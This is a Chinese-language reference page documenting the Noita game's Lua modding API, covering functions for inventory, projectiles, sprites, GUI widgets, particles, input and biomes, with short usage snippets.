<h3 id="GameDestroyInventoryItems"><a href="#GameDestroyInventoryItems" class="headerlink" title="GameDestroyInventoryItems"></a><code>GameDestroyInventoryItems</code></h3><blockquote>
<p>GameDestroyInventoryItems( player_entity )</p>
</blockquote>
<p>销毁物品栏物品，输入实体id，使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">function</span> <span class="token function">OnPlayerDied</span><span class="token punctuation">(</span> player_entity <span class="token punctuation">)</span>
<span class="token function">GameDestroyInventoryItems</span><span class="token punctuation">(</span> player_entity <span class="token punctuation">)</span>
<span class="token function">GameTriggerGameOver</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p>
<h3 id="GameIsInventoryOpen"><a href="#GameIsInventoryOpen" class="headerlink" title="GameIsInventoryOpen"></a><code>GameIsInventoryOpen</code></h3><blockquote>
<p>GameIsInventoryOpen() -&gt; bool</p>
</blockquote>
<p>是否打开了物品栏（背包），返回一个bool值</p>
<h3 id="GameTriggerGameOver"><a href="#GameTriggerGameOver" class="headerlink" title="GameTriggerGameOver"></a><code>GameTriggerGameOver</code></h3><blockquote>
<p>GameTriggerGameOver()</p>
</blockquote>
<p>结束游戏，弹出结算页面，同时镜头不跟随玩家，不负责销毁游戏实体</p>
<h3 id="GameShootProjectile"><a href="#GameShootProjectile" class="headerlink" title="GameShootProjectile"></a><code>GameShootProjectile</code></h3><blockquote>
<p>GameShootProjectile( shooter_entity:int, x:number, y:number, target_x:number, target_y:number, projectile_entity:int, send_message:bool = true, verlet_parent_entity:int = 0 ) [‘shooter_entity’ can be 0. Warning: If ‘projectile_entity’ has PhysicsBodyComponent and ItemComponent, components without the “enabled_in_world” tag will be disabled, as if the entity was thrown by player.]</p>
</blockquote>
<p>发射一个投射物，输入发射者（实体id，可以为0），起点坐标，目标点坐标，投射物实体id，后两个默认，用处未知。如果投射物实体有PhysicsBodyComponent 和 ItemComponent组件，没有“enabled_in_world”标签的组件将不可用，就好像是玩家发出的（翻译官表示没看懂）</p>
<p>使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">ui_name<span class="token operator">=</span><span class="token string">"Test GameShootProjectile bug"</span><span class="token punctuation">,</span>
action <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">local</span> x<span class="token punctuation">,</span>y <span class="token operator">=</span> <span class="token function">GameGetCameraPos</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">local</span> e <span class="token operator">=</span> <span class="token function">EntityLoad</span><span class="token punctuation">(</span> <span class="token string">"data/entities/items/pickup/goldnugget_200.xml"</span> <span class="token punctuation">)</span>
<span class="token function">GameShootProjectile</span><span class="token punctuation">(</span> <span class="token number">0</span><span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> <span class="token keyword">false</span> <span class="token punctuation">)</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h3 id="GameCreateSpriteForXFrames"><a href="#GameCreateSpriteForXFrames" class="headerlink" title="GameCreateSpriteForXFrames"></a><code>GameCreateSpriteForXFrames</code></h3><blockquote>
<p>GameCreateSpriteForXFrames( filename:string, x:number, y:number, centered:bool = true, sprite_offset_x:number = 0, sprite_offset_y:number = 0, frames:int = 1, emissive:bool = false )</p>
</blockquote>
<p>显示一个贴图x帧，输入贴图所在文件路径，坐标，是否居中，坐标偏移，持续帧数（默认1），是否发光，使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token function">GameCreateSpriteForXFrames</span><span class="token punctuation">(</span> <span class="token string">"data/particles/"</span> <span class="token operator">..</span> map_sprite <span class="token operator">..</span> <span class="token string">".png"</span><span class="token punctuation">,</span> mi_x<span class="token punctuation">,</span> mi_y<span class="token punctuation">,</span> <span class="token keyword">true</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">true</span> <span class="token punctuation">)</span>
<span class="token function">GameCreateSpriteForXFrames</span><span class="token punctuation">(</span> <span class="token string">"data/particles/spatial_map_player.png"</span><span class="token punctuation">,</span> pi_x<span class="token punctuation">,</span> pi_y<span class="token punctuation">,</span> <span class="token keyword">true</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">true</span> <span class="token punctuation">)</span>
<span class="token function">GameCreateSpriteForXFrames</span><span class="token punctuation">(</span> <span class="token string">"data/particles/spatial_map_friend.png"</span><span class="token punctuation">,</span> mi_x <span class="token operator">+</span> fx<span class="token punctuation">,</span> mi_y <span class="token operator">+</span> fy<span class="token punctuation">,</span> <span class="token keyword">true</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">true</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
<h2 id="GUI"><a href="#GUI" class="headerlink" title="GUI"></a>GUI</h2><h3 id="GuiCreate"><a href="#GuiCreate" class="headerlink" title="GuiCreate"></a><code>GuiCreate</code></h3><blockquote>
<p>GuiCreate() -&gt; gui:obj</p>
</blockquote>
<p>创造一个gui，返回一个gui对象，用于进一步操作</p>
<h3 id="GuiDestroy"><a href="#GuiDestroy" class="headerlink" title="GuiDestroy"></a><code>GuiDestroy</code></h3><blockquote>
<p>GuiDestroy( gui:obj )</p>
</blockquote>
<p>销毁gui</p>
<h3 id="GuiStartFrame"><a href="#GuiStartFrame" class="headerlink" title="GuiStartFrame"></a><code>GuiStartFrame</code></h3><blockquote>
<p>GuiStartFrame( gui:obj )</p>
</blockquote>
<p>开始GUI帧，在OnWorldPreUpdate时调用，使用gui必要的函数</p>
<h3 id="GuiOptionsAdd"><a href="#GuiOptionsAdd" class="headerlink" title="GuiOptionsAdd"></a><code>GuiOptionsAdd</code></h3><blockquote>
<p>GuiOptionsAdd( gui:obj, option:int ) [Sets the options that apply to widgets during this frame. For ‘option’ use the values in the GUI_OPTION table in “data/scripts/lib/utilities.lua”. Values from consecutive calls will be combined. For example calling this with the values GUI_OPTION.Align_Left and GUI_OPTION.GamepadDefaultWidget will set both options for the next widget. The options will be cleared on next call to GuiStartFrame().]</p>
</blockquote>
<p>给gui增加“选项”，应用一个gui的所有widget，生效一帧，选项列表如下：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">GUI_OPTION <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
None <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>

IsDraggable <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token comment">-- you might not want to use this, because there will be various corner cases and bugs, but feel free to try anyway.</span>
NonInteractive <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token comment">-- works with GuiButton</span>
AlwaysClickable <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">,</span>
ClickCancelsDoubleClick <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">,</span>
IgnoreContainer <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">,</span>
NoPositionTween <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">,</span>
ForceFocusable <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">,</span>
HandleDoubleClickAsClick <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">,</span>
GamepadDefaultWidget <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token comment">-- it's recommended you use this to communicate the widget where gamepad input will focus when entering a new menu</span>

<span class="token comment">-- these work as intended (mostly)</span>
Layout_InsertOutsideLeft <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">,</span>
Layout_InsertOutsideRight <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">,</span>
Layout_InsertOutsideAbove <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">,</span>
Layout_ForceCalculate <span class="token operator">=</span> <span class="token number">13</span><span class="token punctuation">,</span>
Layout_NextSameLine <span class="token operator">=</span> <span class="token number">14</span><span class="token punctuation">,</span>
Layout_NoLayouting <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">,</span>

<span class="token comment">-- these work as intended (mostly)</span>
Align_HorizontalCenter <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">,</span>
Align_Left <span class="token operator">=</span> <span class="token number">17</span><span class="token punctuation">,</span>

FocusSnapToRightEdge <span class="token operator">=</span> <span class="token number">18</span><span class="token punctuation">,</span>

NoPixelSnapY <span class="token operator">=</span> <span class="token number">19</span><span class="token punctuation">,</span>

DrawAlwaysVisible <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">,</span>
DrawNoHoverAnimation <span class="token operator">=</span> <span class="token number">21</span><span class="token punctuation">,</span>
DrawWobble <span class="token operator">=</span> <span class="token number">22</span><span class="token punctuation">,</span>
DrawFadeIn <span class="token operator">=</span> <span class="token number">23</span><span class="token punctuation">,</span>
DrawScaleIn <span class="token operator">=</span> <span class="token number">24</span><span class="token punctuation">,</span>
DrawWaveAnimateOpacity <span class="token operator">=</span> <span class="token number">25</span><span class="token punctuation">,</span>
DrawSemiTransparent <span class="token operator">=</span> <span class="token number">26</span><span class="token punctuation">,</span>
DrawActiveWidgetCursorOnBothSides <span class="token operator">=</span> <span class="token number">27</span><span class="token punctuation">,</span>
DrawActiveWidgetCursorOff <span class="token operator">=</span> <span class="token number">28</span><span class="token punctuation">,</span>

TextRichRendering <span class="token operator">=</span> <span class="token number">29</span><span class="token punctuation">,</span>

NoSound <span class="token operator">=</span> <span class="token number">47</span><span class="token punctuation">,</span>
Hack_ForceClick <span class="token operator">=</span> <span class="token number">48</span><span class="token punctuation">,</span>
Hack_AllowDuplicateIds <span class="token operator">=</span> <span class="token number">49</span><span class="token punctuation">,</span>

ScrollContainer_Smooth <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">,</span>
IsExtraDraggable <span class="token operator">=</span> <span class="token number">51</span><span class="token punctuation">,</span>

_SnapToCenter <span class="token operator">=</span> <span class="token number">62</span><span class="token punctuation">,</span>
Disabled <span class="token operator">=</span> <span class="token number">63</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h3 id="GuiOptionsAddForNextWidget"><a href="#GuiOptionsAddForNextWidget" class="headerlink" title="GuiOptionsAddForNextWidget"></a><code>GuiOptionsAddForNextWidget</code></h3><blockquote>
<p>GuiOptionsAddForNextWidget( gui:obj, option:int ) [Sets the options that apply to the next widget during this frame. For ‘option’ use the values in the GUI_OPTION table in “data/scripts/lib/utilities.lua”. Values from consecutive calls will be combined. For example calling this with the values GUI_OPTION.Align_Left and GUI_OPTION.GamepadDefaultWidget will set both options for the next widget.</p>
</blockquote>
<p>为下一个widget设置“选项”，参数同上，使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token function">GuiOptionsAddForNextWidget</span><span class="token punctuation">(</span> gui<span class="token punctuation">,</span> GUI_OPTION<span class="token punctuation">.</span>DrawActiveWidgetCursorOff <span class="token punctuation">)</span>
<span class="token function">GuiOptionsAddForNextWidget</span><span class="token punctuation">(</span> gui<span class="token punctuation">,</span> GUI_OPTION<span class="token punctuation">.</span>NoPositionTween <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
<h3 id="GuiOptionsRemove"><a href="#GuiOptionsRemove" class="headerlink" title="GuiOptionsRemove"></a><code>GuiOptionsRemove</code></h3><blockquote>
<p>GuiOptionsRemove( gui:obj, option:int ) [Sets the options that apply to widgets during this frame. For ‘option’ use the values in the GUI_OPTION table in “data/scripts/lib/utilities.lua”. Values from consecutive calls will be combined. For example calling this with the values GUI_OPTION.Align_Left and GUI_OPTION.GamepadDefaultWidget will set both options for the next widget. The options will be cleared on next call to GuiStartFrame().]</p>
</blockquote>
<p>移除特定选项，参数同上，真有用吗？</p>
<h3 id="GuiOptionsClear"><a href="#GuiOptionsClear" class="headerlink" title="GuiOptionsClear"></a><code>GuiOptionsClear</code></h3><blockquote>
<p>GuiOptionsClear( gui:obj ) [Clears the options that apply to widgets during this frame.]</p>
</blockquote>
<p>清除gui的所有“选项”，输入gui，同上，真有用吗？</p>
<h3 id="GuiZSet"><a href="#GuiZSet" class="headerlink" title="GuiZSet"></a><code>GuiZSet</code></h3><blockquote>
<p>GuiZSet( gui:obj, z:float ) [Sets the rendering depth (‘z’) of the widgets following this call. Larger z = deeper. The z will be set to 0 on the next call to GuiStartFrame(). ]</p>
</blockquote>
<p>设置gui的深度（覆盖关系，值越大越深，即在下层），输入gui、z值，在下一次GuiStartFrame()时会被清零</p>
<h3 id="GuiZSetForNextWidget"><a href="#GuiZSetForNextWidget" class="headerlink" title="GuiZSetForNextWidget"></a><code>GuiZSetForNextWidget</code></h3><blockquote>
<p>GuiZSetForNextWidget( gui:obj, z:float ) [Sets the rendering depth (‘z’) of the next widget following this call. Larger z = deeper.</p>
</blockquote>
<p>设置下一个widget的渲染深度，用法同上</p>
<h3 id="GuiText"><a href="#GuiText" class="headerlink" title="GuiText"></a><code>GuiText</code></h3><blockquote>
<p>GuiText( gui:obj, x:number, y:number, text:string, scale:number = 1, font:string = “”, font_is_pixel_font:bool = true )</p>
</blockquote>
<p>显示文字，输入gui、在屏幕上的位置、文本内容、放大倍数、字体、字体是否是像素。后三个保持默认即可</p>
<h3 id="GuiIdPush"><a href="#GuiIdPush" class="headerlink" title="GuiIdPush"></a><code>GuiIdPush</code></h3><blockquote>
<p>GuiIdPush( gui:obj, id:int ) [Can be used to solve ID conflicts. All ids given to Gui* functions will be hashed with the ids stacked (and hashed together) using GuiIdPush() and GuiIdPop(). The id stack has a max size of 1024, and calls to the function will do nothing if the size is exceeded.]</p>
</blockquote>
<p>输入gui，id，用于解决ID（后续创建各种widget需要）冲突</p>
<h3 id="GuiIdPushString"><a href="#GuiIdPushString" class="headerlink" title="GuiIdPushString"></a><code>GuiIdPushString</code></h3><blockquote>
<p>GuiIdPushString( gui:obj, str:string ) [Pushes the hash of ‘str’ as a gui id. See GuiIdPush().]</p>
</blockquote>
<h3 id="GuiIdPop"><a href="#GuiIdPop" class="headerlink" title="GuiIdPop"></a><code>GuiIdPop</code></h3><blockquote>
<p>GuiIdPop( gui:obj ) [See GuiIdPush().]</p>
</blockquote>
<h3 id="GuiButton"><a href="#GuiButton" class="headerlink" title="GuiButton"></a><code>GuiButton</code></h3><blockquote>
<p>GuiButton( gui:obj, id:int, x:number, y:number, text:string, scale:number = 1, font:string = “”, font_is_pixel_font:bool = true ) -&gt; clicked:bool,right_clicked:bool [The old parameter order where ‘id’ is the last parameter is still supported. The function dynamically picks the correct order based on the type of the 4th parameter.]</p>
</blockquote>
<p>显示一个文字按钮，输入gui、一个自己管理的id、在屏幕上的位置，字符串、放大倍数……返回两个bool值：是否点击，是否是右键点击</p>
<h3 id="GuiImageButton"><a href="#GuiImageButton" class="headerlink" title="GuiImageButton"></a><code>GuiImageButton</code></h3><blockquote>
<p>GuiImageButton( gui:obj, id:int, x:number, y:number, text:string, sprite_filename:string ) -&gt; clicked:bool,right_clicked:bool</p>
</blockquote>
<p>显示一个图片按钮，输入gui、id、位置、文本、图片文件路径</p>
<h3 id="GuiImage"><a href="#GuiImage" class="headerlink" title="GuiImage"></a><code>GuiImage</code></h3><blockquote>
<p><code>GuiImage(gui, x, y, filename, alpha, scale, rotation)</code> - 显示图像</p>
</blockquote>
<h3 id="GuiImageNinePiece"><a href="#GuiImageNinePiece" class="headerlink" title="GuiImageNinePiece"></a><code>GuiImageNinePiece</code></h3><blockquote>
<p>GuiImageNinePiece( gui:obj, id:int, x:number, y:number, width:number, height:number, alpha:number = 1, sprite_filename:string = “data/ui_gfx/decorations/9piece0_gray.png”, sprite_highlight_filename:string = “data/ui_gfx/decorations/9piece0_gray.png” )</p>
</blockquote>
<p>输入gui，一个不重复的id，屏幕位置，宽、高，透明度、纹理文件</p>
<h3 id="GuiTextInput"><a href="#GuiTextInput" class="headerlink" title="GuiTextInput"></a><code>GuiTextInput</code></h3><blockquote>
<p>GuiTextInput( gui:obj, id:int, x:number, y:number, text:string, width:number, max_length:int, allowed_characters:string = “” ) -&gt; new_text [‘allowed_characters’ should consist only of ASCII characters. This is not intended to be outside mod settings menu, and might bug elsewhere.]</p>
</blockquote>
<p>文本输入框，输入gui、id、位置、在框里显示的文本、宽度、最大长度，返回文本</p>
<h3 id="GuiGetScreenDimensions"><a href="#GuiGetScreenDimensions" class="headerlink" title="GuiGetScreenDimensions"></a><code>GuiGetScreenDimensions</code></h3><blockquote>
<p>GuiGetScreenDimensions( gui:obj ) -&gt; width:number,height:number [Returns dimensions of viewport in the gui coordinate system (which is equal to the coordinates of the screen bottom right corner in gui coordinates). The values returned may change depending on the game resolution because the UI is scaled for pixel-perfect text rendering.]</p>
</blockquote>
<p>输入gui，返回屏幕的宽和高（像素），使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">local</span> screen_w<span class="token punctuation">,</span> screen_h <span class="token operator">=</span> <span class="token function">GuiGetScreenDimensions</span><span class="token punctuation">(</span>gui<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
<h3 id="GuiGetPreviousWidgetInfo"><a href="#GuiGetPreviousWidgetInfo" class="headerlink" title="GuiGetPreviousWidgetInfo"></a><code>GuiGetPreviousWidgetInfo</code></h3><blockquote>
<p>GuiGetPreviousWidgetInfo( gui:obj ) -&gt; clicked:bool, right_clicked:bool, hovered:bool, x:number, y:number, width:number, height:number, draw_x:number, draw_y:number, draw_width:number, draw_height:number [Returns the final position, size etc calculated for a widget. Some values aren’t supported by all widgets.]</p>
</blockquote>
<p>感知一个ui的状态，点击/悬浮等等，输入gui，返回：是否被点击，是否右键点击，是否鼠标悬浮在上面，gui的坐标、宽高、渲染出来的位置、渲染出来的宽、高（部分返回值不适用于所有gui）</p>
<h3 id="GuiColorSetForNextWidget"><a href="#GuiColorSetForNextWidget" class="headerlink" title="GuiColorSetForNextWidget"></a><code>GuiColorSetForNextWidget</code></h3><blockquote>
<p>GuiColorSetForNextWidget( gui:obj, red:number, green:number, blue:number, alpha:number ) [Sets the color of the next widget during this frame. Color components should be in the 0-1 range.]</p>
</blockquote>
<p>设置下一个widget的颜色，输入gui，红绿蓝值（0-1）和透明度</p>
<h2 id="粒子"><a href="#粒子" class="headerlink" title="粒子"></a>粒子</h2><h3 id="GameCreateCosmeticParticle"><a href="#GameCreateCosmeticParticle" class="headerlink" title="GameCreateCosmeticParticle"></a><code>GameCreateCosmeticParticle</code></h3><blockquote>
<p>GameCreateCosmeticParticle( material_name:string, x:number, y:number, how_many:int, xvel:number, yvel:number, color:uint32 = 0, lifetime_min:number = 5.0, lifetime_max:number = 10, force_create:bool = true, draw_front:bool = false, collide_with_grid:bool = true, randomize_velocity:bool = true, gravity_x:float = 0, gravity_y:float = 100.0 )</p>
</blockquote>
<pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token function">GameCreateCosmeticParticle</span><span class="token punctuation">(</span>
          material<span class="token punctuation">,</span>       <span class="token comment">-- 材质名</span>
          xi<span class="token punctuation">,</span> yi<span class="token punctuation">,</span>         <span class="token comment">-- 坐标</span>
          how_many_per_point<span class="token punctuation">,</span> <span class="token comment">-- 每个点生成粒子数</span>
          <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>           <span class="token comment">-- xvel, yvel初速度</span>
          <span class="token number">0</span><span class="token punctuation">,</span>              <span class="token comment">-- color (0表示默认)</span>
          <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>          <span class="token comment">-- lifetime_min, lifetime_max</span>
          <span class="token keyword">true</span><span class="token punctuation">,</span>           <span class="token comment">-- force_create</span>
          <span class="token keyword">false</span><span class="token punctuation">,</span>          <span class="token comment">-- draw_front</span>
          <span class="token keyword">false</span><span class="token punctuation">,</span>          <span class="token comment">-- collide_with_grid 不碰撞</span>
          <span class="token keyword">true</span><span class="token punctuation">,</span>          <span class="token comment">-- randomize_velocity false 固定位置</span>
          <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>            <span class="token comment">-- gravity_x, gravity_y =0 不受重力</span>
<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>大部分材料都可以填进material里，比如spark</p>
<h3 id="GameCreateParticle"><a href="#GameCreateParticle" class="headerlink" title="GameCreateParticle"></a><code>GameCreateParticle</code></h3><blockquote>
<p>GameCreateParticle( material_name:string, x:number, y:number, how_many:int, xvel:number, yvel:number, just_visual:bool, draw_as_long:bool = false, randomize_velocity:bool = true )</p>
</blockquote>
<p>生成粒子，输入材料名，坐标，数量，xy轴初速度，是否只用于视觉效果，是否画成长条形，是否随机化初速度，使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token function">GameCreateParticle</span><span class="token punctuation">(</span> <span class="token string">"slime_green"</span><span class="token punctuation">,</span> x<span class="token operator">+</span><span class="token number">20</span><span class="token punctuation">,</span> y<span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token keyword">true</span><span class="token punctuation">,</span> <span class="token keyword">false</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
<h2 id="Input……"><a href="#Input……" class="headerlink" title="Input……"></a>Input……</h2><h3 id="InputIsKeyDown"><a href="#InputIsKeyDown" class="headerlink" title="InputIsKeyDown"></a><code>InputIsKeyDown</code></h3><blockquote>
<p>InputIsKeyDown( key_code\:int ) -&gt; bool<br>(Debugish function - returns if a key is down, does not depend on state. E.g. player could be in menus or inputting text. See <code>data/scripts/debug/keycodes.lua</code> for the constants.)</p>
</blockquote>
<p>检测某个键是否正在被按下。即使玩家在菜单界面或输入文字时，也会返回真实的按键状态。<code>key_code</code> 常量可在 <code>data/scripts/debug/keycodes.lua</code> 中查找。</p>
<h3 id="InputIsKeyJustDown"><a href="#InputIsKeyJustDown" class="headerlink" title="InputIsKeyJustDown"></a><code>InputIsKeyJustDown</code></h3><blockquote>
<p>InputIsKeyJustDown( key_code\:int ) -&gt; bool<br>(Debugish function - returns if a key is down this frame, does not depend on state.)</p>
</blockquote>
<p>检测某个键是否在本帧刚刚被按下（按键触发瞬间）。<br>不受游戏状态影响，在菜单或文字输入中也会检测到。</p>
<h3 id="InputIsKeyJustUp"><a href="#InputIsKeyJustUp" class="headerlink" title="InputIsKeyJustUp"></a><code>InputIsKeyJustUp</code></h3><blockquote>
<p>InputIsKeyJustUp( key_code\:int ) -&gt; bool<br>(Debugish function - returns if a key is up this frame, does not depend on state.)</p>
</blockquote>
<p>检测某个键是否在本帧刚刚被释放。同样独立于游戏状态。</p>
<h3 id="InputGetMousePosOnScreen"><a href="#InputGetMousePosOnScreen" class="headerlink" title="InputGetMousePosOnScreen"></a><code>InputGetMousePosOnScreen</code></h3><blockquote>
<p>InputGetMousePosOnScreen() -&gt; x\:number, y\:number<br>(Debugish function - returns raw x, y coordinates of the mouse on screen)</p>
</blockquote>
<p>获取鼠标在屏幕上的原始坐标（像素单位）。</p>
<h3 id="InputIsMouseButtonDown"><a href="#InputIsMouseButtonDown" class="headerlink" title="InputIsMouseButtonDown"></a><code>InputIsMouseButtonDown</code></h3><blockquote>
<p>InputIsMouseButtonDown( mouse_button\:int ) -&gt; bool<br>(Debugish function - returns if mouse button is down. Does not depend on state.)</p>
</blockquote>
<p>检测鼠标某个按键是否处于按下状态。<br><code>mouse_button</code> 常量可在 <code>data/scripts/debug/keycodes.lua</code> 查找。</p>
<h3 id="InputIsMouseButtonJustDown"><a href="#InputIsMouseButtonJustDown" class="headerlink" title="InputIsMouseButtonJustDown"></a><code>InputIsMouseButtonJustDown</code></h3><blockquote>
<p>InputIsMouseButtonJustDown( mouse_button\:int ) -&gt; bool<br>(Debugish function - returns if mouse button is just down. Does not depend on state.)</p>
</blockquote>
<p>检测鼠标按键是否在本帧刚刚被按下。</p>
<h3 id="InputIsMouseButtonJustUp"><a href="#InputIsMouseButtonJustUp" class="headerlink" title="InputIsMouseButtonJustUp"></a><code>InputIsMouseButtonJustUp</code></h3><blockquote>
<p>InputIsMouseButtonJustUp( mouse_button\:int ) -&gt; bool<br>(Debugish function - returns if mouse button is just up. Does not depend on state.)</p>
</blockquote>
<p>检测鼠标按键是否在本帧刚刚被释放。</p>
<h3 id="InputIsJoystickButtonDown"><a href="#InputIsJoystickButtonDown" class="headerlink" title="InputIsJoystickButtonDown"></a><code>InputIsJoystickButtonDown</code></h3><blockquote>
<p>InputIsJoystickButtonDown( joystick_index\:int, joystick_button\:int ) -&gt; bool<br>(Debugish function - returns if ‘joystick’ button is down. Does not depend on state.)</p>
</blockquote>
<p>检测手柄指定按钮是否处于按下状态。<br><code>joystick_index</code> 表示手柄编号（从 0 开始），<code>joystick_button</code> 常量见 <code>keycodes.lua</code>。</p>
<h3 id="InputIsJoystickButtonJustDown"><a href="#InputIsJoystickButtonJustDown" class="headerlink" title="InputIsJoystickButtonJustDown"></a><code>InputIsJoystickButtonJustDown</code></h3><blockquote>
<p>InputIsJoystickButtonJustDown( joystick_index\:int, joystick_button\:int ) -&gt; bool<br>(Debugish function - returns if ‘joystick’ button is just down. Does not depend on state.)</p>
</blockquote>
<p>检测手柄按钮是否在本帧刚刚被按下。</p>
<h3 id="InputGetJoystickAnalogButton"><a href="#InputGetJoystickAnalogButton" class="headerlink" title="InputGetJoystickAnalogButton"></a><code>InputGetJoystickAnalogButton</code></h3><blockquote>
<p>InputGetJoystickAnalogButton( joystick_index\:int, analog_button_index\:int ) -&gt; float<br>(Debugish function - returns analog ‘joystick’ button value (0-1). analog_button_index 0 = left trigger, 1 = right trigger.)</p>
</blockquote>
<p>获取手柄的模拟按键（通常是扳机键）当前的压力值，范围 0~1。<br><code>analog_button_index</code>：</p>
<ul>
<li><code>0</code> = 左扳机</li>
<li><code>1</code> = 右扳机</li>
</ul>
<h3 id="InputIsJoystickConnected"><a href="#InputIsJoystickConnected" class="headerlink" title="InputIsJoystickConnected"></a><code>InputIsJoystickConnected</code></h3><blockquote>
<p>InputIsJoystickConnected( joystick_index\:int ) -&gt; bool<br>(Debugish function - returns true if ‘joystick’ at that index is connected. Does not depend on state.)</p>
</blockquote>
<p>检测指定编号的手柄是否已连接。</p>
<h3 id="InputGetJoystickAnalogStick"><a href="#InputGetJoystickAnalogStick" class="headerlink" title="InputGetJoystickAnalogStick"></a><code>InputGetJoystickAnalogStick</code></h3><blockquote>
<p>InputGetJoystickAnalogStick( joystick_index\:int, stick_id\:int = 0 ) -&gt; float x, float y<br>(Debugish function - returns analog stick positions (-1,+1). stick_id 0 = left, 1 = right.)</p>
</blockquote>
<p>获取手柄摇杆的当前位置（X、Y 坐标范围 -1~+1）。<br><code>stick_id</code>：</p>
<ul>
<li><code>0</code> = 左摇杆</li>
<li><code>1</code> = 右摇杆</li>
</ul>
<h2 id="Biome……（群系）"><a href="#Biome……（群系）" class="headerlink" title="Biome……（群系）"></a>Biome……（群系）</h2><p>备注：群系生效的最小单位是区块，以下坐标如果有忘记说明均做区块处理</p>
<h3 id="BiomeMapLoad-KeepPlayer"><a href="#BiomeMapLoad-KeepPlayer" class="headerlink" title="BiomeMapLoad_KeepPlayer"></a><code>BiomeMapLoad_KeepPlayer</code></h3><blockquote>
<p>BiomeMapLoad_KeepPlayer( filename:string, pixel_scenes:string = “data/biome/_pixel_scenes.xml” )</p>
</blockquote>
<p>保留玩家加载群系地图，输入一个群系lua文件路径，一个像素场景xml文件<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token comment">--ng+</span>
<span class="token function">BiomeMapLoad_KeepPlayer</span><span class="token punctuation">(</span> <span class="token string">"data/biome_impl/biome_map_newgame_plus.lua"</span><span class="token punctuation">,</span> <span class="token string">"data/biome/_pixel_scenes_newgame_plus.xml"</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
<h3 id="BiomeSetValue"><a href="#BiomeSetValue" class="headerlink" title="BiomeSetValue"></a><code>BiomeSetValue</code></h3><blockquote>
<p>BiomeSetValue( filename:string, field_name:string, value:multiple_types ) [Can be used to edit biome configs during initialization. See the nightmare mod for an usage example.]</p>
</blockquote>
